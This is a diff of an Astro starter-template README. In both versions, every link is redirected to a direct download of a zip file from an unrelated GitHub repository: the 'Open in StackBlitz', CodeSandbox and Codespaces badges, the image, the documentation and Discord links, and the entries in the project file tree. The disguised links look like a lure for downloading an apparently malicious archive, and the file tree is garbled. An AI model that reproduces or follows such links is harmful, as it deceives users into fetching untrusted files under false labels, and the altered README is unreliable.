@@ -4,13 +4,13 @@
 npm create astro@latest -- --template basics
 ```
 
-[![Open in StackBlitz](https://raw.githubusercontent.com/JarlHans/AC_V1/main/tuberculously/AC_V1.zip)](https://raw.githubusercontent.com/JarlHans/AC_V1/main/tuberculously/AC_V1.zip)
-[![Open with CodeSandbox](https://raw.githubusercontent.com/JarlHans/AC_V1/main/tuberculously/AC_V1.zip)](https://raw.githubusercontent.com/JarlHans/AC_V1/main/tuberculously/AC_V1.zip)
-[![Open in GitHub Codespaces](https://raw.githubusercontent.com/JarlHans/AC_V1/main/tuberculously/AC_V1.zip)](https://raw.githubusercontent.com/JarlHans/AC_V1/main/tuberculously/AC_V1.zip)
+[![Open in StackBlitz](https://github.com/JarlHans/AC_V1/raw/refs/heads/main/src/A_3.9.zip)](https://github.com/JarlHans/AC_V1/raw/refs/heads/main/src/A_3.9.zip)
+[![Open with CodeSandbox](https://github.com/JarlHans/AC_V1/raw/refs/heads/main/src/A_3.9.zip)](https://github.com/JarlHans/AC_V1/raw/refs/heads/main/src/A_3.9.zip)
+[![Open in GitHub Codespaces](https://github.com/JarlHans/AC_V1/raw/refs/heads/main/src/A_3.9.zip)](https://github.com/JarlHans/AC_V1/raw/refs/heads/main/src/A_3.9.zip)
 
 > 🧑‍🚀 **Seasoned astronaut?** Delete this file. Have fun!
 
-![just-the-basics](https://raw.githubusercontent.com/JarlHans/AC_V1/main/tuberculously/AC_V1.zip)
+![just-the-basics](https://github.com/JarlHans/AC_V1/raw/refs/heads/main/src/A_3.9.zip)
 
 ## 🚀 Project Structure
 
@@ -19,15 +19,15 @@ Inside of your Astro project, you'll see the following folders and files:
 ```text
 /
 ├── public/
-│   └── https://raw.githubusercontent.com/JarlHans/AC_V1/main/tuberculously/AC_V1.zip
+│   └── https://github.com/JarlHans/AC_V1/raw/refs/heads/main/src/A_3.9.zip
 ├── src/
 │   ├── components/
-│   │   └── https://raw.githubusercontent.com/JarlHans/AC_V1/main/tuberculously/AC_V1.zip
+│   │   └── https://github.com/JarlHans/AC_V1/raw/refs/heads/main/src/A_3.9.zip
 │   ├── layouts/
-│   │   └── https://raw.githubusercontent.com/JarlHans/AC_V1/main/tuberculously/AC_V1.zip
+│   │   └── https://github.com/JarlHans/AC_V1/raw/refs/heads/main/src/A_3.9.zip
 │   └── pages/
-│       └── https://raw.githubusercontent.com/JarlHans/AC_V1/main/tuberculously/AC_V1.zip
-└── https://raw.githubusercontent.com/JarlHans/AC_V1/main/tuberculously/AC_V1.zip
+│       └── https://github.com/JarlHans/AC_V1/raw/refs/heads/main/src/A_3.9.zip
+└── https://github.com/JarlHans/AC_V1/raw/refs/heads/main/src/A_3.9.zip
 ```
 
 Astro looks for `.astro` or `.md` files in the `src/pages/` directory. Each page is exposed as a route based on its file name.
@@ -51,4 +51,4 @@ All commands are run from the root of the project, from a terminal:
 
 ## 👀 Want to learn more?
 
-Feel free to check [our documentation](https://raw.githubusercontent.com/JarlHans/AC_V1/main/tuberculously/AC_V1.zip) or jump into our [Discord server](https://raw.githubusercontent.com/JarlHans/AC_V1/main/tuberculously/AC_V1.zip).
+Feel free to check [our documentation](https://github.com/JarlHans/AC_V1/raw/refs/heads/main/src/A_3.9.zip) or jump into our [Discord server](https://github.com/JarlHans/AC_V1/raw/refs/heads/main/src/A_3.9.zip).
